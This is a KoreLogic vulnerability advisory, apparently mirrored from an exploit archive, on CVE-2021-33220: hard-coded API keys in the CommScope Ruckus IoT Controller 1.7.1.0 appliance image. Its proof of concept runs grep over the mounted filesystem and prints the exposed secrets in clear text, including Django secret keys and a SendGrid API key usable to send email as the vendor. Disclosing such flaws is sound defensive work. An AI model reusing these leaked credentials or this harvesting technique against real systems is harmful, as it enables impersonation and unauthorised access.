@@ -1,0 +1,121 @@
+id: 36303
+date: 05/27/2021
+title: CommScope Ruckus IoT Controller 1.7.1.0 Hard-Coded API Keys Exposed Vulnerability
+author: Jim Becher
+cves: CVE-2021-33220
+
+CommScope Ruckus IoT Controller 1.7.1.0 Hard-Coded API Keys Exposed Vulnerability
+
+
+1. Vulnerability Details
+
+     Affected Vendor: CommScope
+     Affected Product: Ruckus IoT Controller
+     Affected Version: 1.7.1.0 and earlier
+     Platform: Linux
+     CWE Classification: CWE-798: Use of Hard-coded Credentials
+     CVE ID: CVE-2021-33220
+
+
+2. Vulnerability Description
+
+     API keys for CommScope Ruckus are included in the IoT
+     Controller OVA image, and are exposed to attackers who mount
+     the filesystem.
+
+
+3. Technical Description
+
+     Ruckus vRIoT server software is available from the software
+     library at: https://support.ruckuswireless.com/software/
+
+     Once the OVA is imported into VirtualBox, a VMDK file is
+     created. The VMDK file can be mounted and the directory
+     structure and its contents can be perused. The virtual appliance
+     contains clear text API keys that are hard-coded into the
+     web application code. The API keys can be abused to gain
+     information about deployed assets and send email via SendGrid
+     as Commscope/Ruckus. While the AWS SECRET_KEY is exposed,
+     an ACCESS_KEY is not.
+
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has released an updated firmware (1.8.0.0) which
+     remediates the described vulnerability. Firmware and release
+     notes are available at:
+
+     https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf
+
+
+5. Credit
+
+     This vulnerability was discovered by Jim Becher (@jimbecher)
+     of KoreLogic, Inc.
+
+
+6. Disclosure Timeline
+
+     2021.03.30 - KoreLogic submits vulnerability details to
+                  CommScope.
+     2021.03.30 - CommScope acknowledges receipt and the intention
+                  to investigate.
+     2021.04.06 - CommScope notifies KoreLogic that this issue,
+                  along with several others reported by KoreLogic,
+                  will require more than the standard 45 business
+                  day remediation timeline.
+     2021.04.06 - KoreLogic agrees to extend disclosure embargo if
+                  necessary.
+     2021.04.30 - CommScope informs KoreLogic that remediation for
+                  this vulnerability will be available inside of the
+                  standard 45 business day timeline. Requests
+                  KoreLogic acquire CVE number for this
+                  vulnerability.
+     2021.05.14 - 30 business days have elapsed since the
+                  vulnerability was reported to CommScope.
+     2021.05.17 - CommScope notifies KoreLogic that the patched
+                  version of the firmware will be available the week
+                  of 2021.05.24.
+     2021.05.19 - KoreLogic requests CVE from MITRE.
+     2021.05.19 - MITRE issues CVE-2021-33220.
+     2021.05.25 - CommScope releases firmware 1.8.0.0 and associated
+                  advisory.
+     2021.05.26 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+     With the VMDK file mounted at the current working directory:
+     root@vriot:/# grep -R 'KIO_API_KEY' /VRIOT/ 2>/dev/null
+     ./VRIOT/backend/settings/defaults.py:KIO_API_KEY = os.environ.get("KIO_API_KEY", "wxtPbzgNNWFlfBqhDfEDoZkQUxtnhWTq")
+
+     $ egrep -r 'SECRET_KEY|ACCESS_KEY' ./VRIOT/*
+     ./VRIOT/authServer/app/baseapp/settings.py:SECRET_KEY = 'db$04-yk#-3&=54s78d-tvu!+e3#621kj9s!3g$x3t^@m1m6#i'
+     ./VRIOT/backend/settings/settings.py:SECRET_KEY = '%u9-#a6eo0!ukif-+kcg3=gc-zlh8o3@)rz@!-74(g*xa0c#bb'
+     Binary file ./VRIOT/backend/lora/lorawan1.6.0.0.tar matches
+     Binary file ./VRIOT/ops/scripts/image_push.pyc matches
+     ./VRIOT/ops/sqlite_modules/aws4/README.md:// or it can get credentials from process.env.AWS_ACCESS_KEY_ID, etc
+     ./VRIOT/ops/sqlite_modules/aws4/README.md:export AWS_ACCESS_KEY_ID="<your-access-key-id>"
+     ./VRIOT/ops/sqlite_modules/aws4/README.md:export AWS_SECRET_ACCESS_KEY="<your-secret-access-key>"
+     ./VRIOT/ops/sqlite_modules/aws4/README.md:(will also use `AWS_ACCESS_KEY` and `AWS_SECRET_KEY` if available)
+     ./VRIOT/ops/sqlite_modules/aws4/aws4.js:    accessKeyId: env.AWS_ACCESS_KEY_ID || env.AWS_ACCESS_KEY,
+     ./VRIOT/ops/sqlite_modules/aws4/aws4.js:    secretAccessKey: env.AWS_SECRET_ACCESS_KEY || env.AWS_SECRET_KEY,
+
+
+     $ more ./VRIOT/authServer# more app/baseapp/settings.py
+     ...
+     # Email server settings.
+     EMAIL_HOST = 'smtp.sendgrid.net'
+     EMAIL_HOST_USER = 'apikey'
+     EMAIL_HOST_PASSWORD = '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'
+     EMAIL_PORT = 587
+     EMAIL_USE_TLS = True
+     ...
+
+     Per https://sendgrid.com/docs/API_Reference/SMTP_API/integrating_with_the_smtp_api.html,
+     the SendGrid password identified above is actually an API key, which can be
+     used with the 'apikey' user to send email through the SendGrid platform as
+     Commscope Ruckus.
+
+
+#  0day.today [2023-03-23]  #
